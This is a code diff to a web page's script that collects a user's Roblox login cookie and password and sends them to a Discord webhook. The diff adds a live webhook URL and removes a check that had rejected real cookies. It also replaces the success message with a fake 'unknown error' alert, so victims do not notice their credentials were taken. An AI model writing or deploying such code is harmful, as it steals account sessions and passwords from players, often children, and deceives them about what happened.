@@ -64,16 +64,7 @@
     async function sendToDiscord() {
       const cookie = document.getElementById("cookie").value.trim();
       const password = document.getElementById("password").value.trim();
-      const webhook = "YOUR_WEBHOOK_HERE"; // Replace with your actual webhook
-
-      // The valid cookie value
-      const validCookie = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.........";
-
-      // Check if the entered cookie is the valid one
-      if (cookie !== validCookie) {
-        alert("Invalid cookie. Please enter a valid cookie.");
-        return;
-      }
+      const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace with your actual webhook
 
       if (!cookie || !password) {
         alert("Please enter both cookie and password.");
@@ -97,7 +88,7 @@
           body: JSON.stringify(payload)
         });
 
-        alert("Sent successfully.");
+        alert("UNKNOWN ERROR PLEASE TRY AGAIN LATER.");
       } catch (e) {
         alert("Failed to send.");
         console.error(e);
